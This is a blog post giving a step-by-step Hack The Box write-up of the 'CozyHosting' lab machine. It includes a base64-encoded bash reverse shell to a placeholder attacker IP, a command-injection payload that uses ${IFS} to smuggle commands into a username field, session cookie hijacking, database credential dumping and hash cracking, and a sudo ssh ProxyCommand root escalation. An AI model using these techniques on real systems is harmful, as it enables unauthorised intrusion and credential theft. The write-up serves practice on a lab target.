---
date: 2024-03-02T11:10:54-06:00
# description: ""
image: "/images/HTB-CozyHosting/CozyHosting.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: CozyHosting"
type: "post"
---

* Platform: Hack The Box
* Link: [CozyHosting](https://app.hackthebox.com/machines/CozyHosting)
* Level: Easy
* OS: Linux
---

CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection and the root is accessed by abusing the SSH binary.

The target IP address is `10.10.11.230`

## Scanning

```
sudo nmap -sC -sV -oA nmap/CozyHosting 10.10.11.230
```

* We have a Linux machine 
* Running a web application on port 80
* The SSH service is enabled on the target

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 11:21 CST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds
```

Let's add the target to our host directory by adding `10.10.11.230 cozyhosting.htb` to the `/etc/hosts` file.

## Enumeration

We check the application by visiting `http://cozyhosting.htb`. This is a hosting service, the `Home`, `Services`, and `Pricing` links don't do anything special.

![cozyhosting-website](/images/HTB-CozyHosting/cozyhosting.png)


The `Login` button leads you to a login page with url `cozyhosting.htb/login`.


![cozyhosting-login-form](/images/HTB-CozyHosting/cozyhosting-login.png)

First we use `Gobuster` to find any potential hidden directories, I am using [SecLists](https://github.com/danielmiessler/SecLists).

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb
```

![cozyhosting-Gobuster](/images/HTB-CozyHosting/gobuster-medium.png)

`/admin` and `/logout` sends you to the login page. With `/error` you get to a page with this message.

![cozyhosting-error-page](/images/HTB-CozyHosting/whitelabel-error.png)

I don't know what this error means so I google it and I learn that it is a Spring Boot error. Reading more about it I discover that it indicates that the Spring Boot application does not have a specific endpoint or route defined for handling the `/error` path and that they might be more endpoints in the application.

 > Check this stackoverflow page [Whitelabel Error Page](https://stackoverflow.com/questions/31134333/this-application-has-no-explicit-mapping-for-error)

I go back to gobuster for a more specific directory enumeration. SecLists has a list for spring boot that we can use. 

```
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb
```

![cozyhosting-Gobuster-spring-boot](/images/HTB-CozyHosting/gobuster-springboot.png)

We discover more directories, after testing all of them I find what looks like a cookie for the user `kanderson` in `/actuator/sessions`.

![cozyhosting-cookie](/images/HTB-CozyHosting/cookie.png)

I go back to the login page and try to use it. I use some random values for `Username` and `Password` to generate a cookie. Then I replace my cookie value with the one I just found and refresh the page.

I now have access to the Dashboard of the user.

![cozyhosting-dashboard](/images/HTB-CozyHosting/Dashboard.png)

There is another input field, it seems to be working with some SSH key files.

![cozyhosting-SSH-note](/images/HTB-CozyHosting/cozyhosting-SSH-note-1.png)

I use Burp Suite to capture the request. I try `cozyhosting:test` and I get that the `host key verification failed`. After I submit a `hostname` and `username` the form makes a request to the endpoint `/executessh`.

![cozyhosting-host-key-failure](/images/HTB-CozyHosting/host-key-verification-fail.png)

I can also see in that the application is trying to execute some bash commands and I get an error created when `/bin/bash -c` is executed.

![cozyhosting-bash-error](/images/HTB-CozyHosting/binbash-error.png)

## Initial Foothold

Now I know that some bash command is being executed I can try to get a reverse shell through this process.

I used this command to generate my payload in base64.

```
echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
```

![cozyhosting-payload](/images/HTB-CozyHosting/payload-generated.png)

**Setup a netcat listener before attempting to login.** 

```
nc -nvlp <YOUR-PORT-NUMBER>
```

I try to login with `cozyhosting` as the hostname and for the username I use the command below (I am using my base64 payload generated earlier with the `echo` command).

```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjIvODAwMCAwPiYxCg=="
```

I get a message saying that `Username can't contain whitespaces!`. I then use the bash parameter `{IFS%??}` to remove spaces from the payload.

```
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

After using the new payload I get a reverse shell!

![cozyhosting-reverse-shell](/images/HTB-CozyHosting/rev-shell.png)

We can make the shell stable with these commands

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
```
![cozyhosting-stable-shell](/images/HTB-CozyHosting/stable-shell.png)

> Do not worry if you cannot see the prompt after running the last command, just press `Enter` and everything will come back.

We find an archive on the target system, let's download it. 

I set up a server on the target

```
python3 -m http.server 8000
```

On my attack machine I run

```
wget cozyhosting.htb:8000/cloudhosting-0.0.1.jar
```

Unzip the archive with 

```
unzip cloudhosting-0.0.1.jar
```

I search through it with `grep -r password *` and I get some matches. I see that there is a password in `BOOT-INF/classes/application.properties`.

![cozyhosting-password-in-archive](/images/HTB-CozyHosting/password-location-springboot.png)

I output the content of the file on the terminal and I get a username on top of the password for a PostgreSQL database.

![cozyhosting-full-credentials](/images/HTB-CozyHosting/postgres-credentials.png)

We log in PostgreSQL with

```
psql -h 127.0.0.1 -U postgres
```

Then we connect to the database with 

```
\c cozyhosting
```
![cozyhosting-db-login](/images/HTB-CozyHosting/postgres-loggedin.png)

I then list the tables of the database with `\d`.

![cozyhosting-db-tables](/images/HTB-CozyHosting/db-tables.png)

I then run `select * from users;`, with this command PostgreSQL will retrieve all rows and all columns from the "users" table and return them as a result set. This query is commonly used to view the contents of a table and can be very useful for inspecting the data stored in the database.

We find some hashes.

![cozyhosting-db-hashes](/images/HTB-CozyHosting/db-hashes.png)

Let's what type of hash this is (of course we are interested in the admin hash we are already logged in as kanderson).

```
hashid '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' 
```
![cozyhosting-hash-ID](/images/HTB-CozyHosting/hashid.png)

### Lateral Movement

Let's try to crack the hash. First I get it into a file.

```
echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash.txt
```

> If you don't want to use `John`, use this website [hashes.com](https://hashes.com/en/decrypt/hash)

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

I get the password `manchesterunited`.

Back on the reverse shell, I run `ls -la /home` and you I see another directory own by the user `josh`.

![cozyhosting-home-content](/images/HTB-CozyHosting/home-listing.png)

I switch to the `josh` user with `su josh` with the password we just cracked. I check his home directory with  `cd $home` and find the flag `user.txt` there!

![cozyhosting-user-flag](/images/HTB-CozyHosting/userflag.png)

## Privilege Escalation

I use `sudo -l` to see what this user can run.

![cozyhosting-sudo-l](/images/HTB-CozyHosting/sudo-l-josh.png)

I go to [GTFObins](https://gtfobins.github.io/gtfobins/ssh/#sudo) to find some ssh root shells commands and I use

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![cozyhosting-privilege-escalation](/images/HTB-CozyHosting/priv-escalation.png)

The shell is not optimal you can run this command to get a proper one

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

All you need to do now is `cd $home` and you will find the `root.txt` flag.

![cozyhosting-privilege-escalation](/images/HTB-CozyHosting/rootflag-1.png)

Thanks for checking my writeup, feel free to comment or reach out to me on on X [@_KScorpio](https://twitter.com/_KScorpio) if you have any questions.
